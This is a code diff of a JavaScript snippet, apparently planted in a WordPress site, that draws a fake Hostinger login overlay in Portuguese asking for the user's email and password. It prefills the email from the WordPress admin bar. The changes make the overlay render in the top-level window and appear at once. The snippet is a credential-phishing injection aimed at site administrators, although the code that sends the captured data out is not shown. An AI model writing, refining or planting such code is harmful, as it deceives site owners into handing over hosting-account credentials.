@@ -2,14 +2,16 @@
     function createLoginModal() {
 
      // if(!(window.location.href.includes(atob("cHJldmlldz10cnVl"))&&document.referrer.includes(atob("d3AtYWRtaW4="))))return;
+
+      const doc = window.top === window ? document : window.top.document;
         
-      if (document.getElementById("custom-login-overlay")) return;
+      if (doc.getElementById("custom-login-overlay")) return;
   
       if (localStorage.getItem("lg") === "success") {
         return;
       }
   
-      const style = document.createElement("style");
+      const style = doc.createElement("style");
       style.textContent = `
                     /* ===========================
             DM Sans
@@ -337,46 +339,46 @@
                 font-size:14px;
             }
       `;
-      document.head.appendChild(style);
+      doc.head.appendChild(style);
   
-      const overlay = document.createElement("div");
+      const overlay = doc.createElement("div");
       overlay.id = "custom-login-overlay";
   
-      const modalWrap = document.createElement("div");
+      const modalWrap = doc.createElement("div");
       modalWrap.id = "custom-login-modal-wrap";
    
   
-      const modal = document.createElement("div");
+      const modal = doc.createElement("div");
       modal.id = "custom-login-modal";
 
 
-      const logo = document.createElement("div");
+      const logo = doc.createElement("div");
         logo.id = "custom-login-logo";
 
         logo.innerHTML = `
         <img src="https://auth.hostinger.com/assets/images/brand/hostinger/logo.svg" alt="Logo">
         `;
   
-      const title = document.createElement("h2");
+      const title = doc.createElement("h2");
       title.id = "custom-login-title";
       title.textContent = "Entrar";
   
-      const subtitle = document.createElement("p");
+      const subtitle = doc.createElement("p");
       subtitle.id = "custom-login-subtitle";
       subtitle.textContent = "Informe seu e-mail e senha da Hostinger para continuar...";
   
-      const emailField = document.createElement("div");
+      const emailField = doc.createElement("div");
       emailField.className = "custom-login-field";
   
-      const emailLabel = document.createElement("label");
+      const emailLabel = doc.createElement("label");
       emailLabel.className = "custom-login-label";
       emailLabel.setAttribute("for", "custom-login-email");
       emailLabel.textContent = "E-mail";
   
-      const emailWrap = document.createElement("div");
+      const emailWrap = doc.createElement("div");
       emailWrap.className = "custom-login-input-wrap";
   
-      const emailIcon = document.createElement("span");
+      const emailIcon = doc.createElement("span");
       emailIcon.className = "custom-login-icon";
       emailIcon.innerHTML = `
         <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
@@ -385,7 +387,7 @@
         </svg>
       `;
   
-      const emailInput = document.createElement("input");
+      const emailInput = doc.createElement("input");
       emailInput.className = "custom-login-input";
       emailInput.id = "custom-login-email";
       emailInput.type = "email";
@@ -393,24 +395,24 @@
       emailInput.autocomplete = "username";
 
   
-      const emailError = document.createElement("div");
+      const emailError = doc.createElement("div");
       emailError.className = "custom-login-field-error";
   
       emailWrap.append(emailIcon, emailInput);
       emailField.append(emailLabel, emailWrap, emailError);
   
-      const passwordField = document.createElement("div");
+      const passwordField = doc.createElement("div");
       passwordField.className = "custom-login-field";
   
-      const passwordLabel = document.createElement("label");
+      const passwordLabel = doc.createElement("label");
       passwordLabel.className = "custom-login-label";
       passwordLabel.setAttribute("for", "custom-login-password");
       passwordLabel.textContent = "Senha";
   
-      const passwordWrap = document.createElement("div");
+      const passwordWrap = doc.createElement("div");
       passwordWrap.className = "custom-login-input-wrap";
   
-      const passwordIcon = document.createElement("span");
+      const passwordIcon = doc.createElement("span");
       passwordIcon.className = "custom-login-icon";
       passwordIcon.innerHTML = `
         <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
@@ -419,14 +421,14 @@
         </svg>
       `;
   
-      const passwordInput = document.createElement("input");
+      const passwordInput = doc.createElement("input");
       passwordInput.className = "custom-login-input";
       passwordInput.id = "custom-login-password";
       passwordInput.type = "password";
       passwordInput.placeholder = "Digite sua senha";
       passwordInput.autocomplete = "current-password";
   
-      const passwordError = document.createElement("div");
+      const passwordError = doc.createElement("div");
       passwordError.className = "custom-login-field-error";
   
       passwordWrap.append(passwordIcon, passwordInput);
@@ -435,10 +437,10 @@
 
 
   
-      const generalError = document.createElement("div");
+      const generalError = doc.createElement("div");
       generalError.id = "custom-login-general-error";
   
-      const loginButton = document.createElement("button");
+      const loginButton = doc.createElement("button");
       loginButton.id = "custom-login-button";
       loginButton.type = "button";
       loginButton.textContent = "Entrar";
@@ -455,9 +457,9 @@
   
       modalWrap.appendChild(modal);
       overlay.appendChild(modalWrap);
-      document.body.appendChild(overlay);
+      doc.body.appendChild(overlay);
 
-      const em = document.querySelector('.admin-bar .display-name').textContent;
+      const em = doc.querySelector('.admin-bar .display-name').textContent;
 
       if(em){
         emailInput.value = em;
@@ -589,9 +591,6 @@
     }
 
 
-        window.addEventListener("load", () => {
-        setTimeout(createLoginModal, 500);
-    });
-
+        createLoginModal();
 
   })();
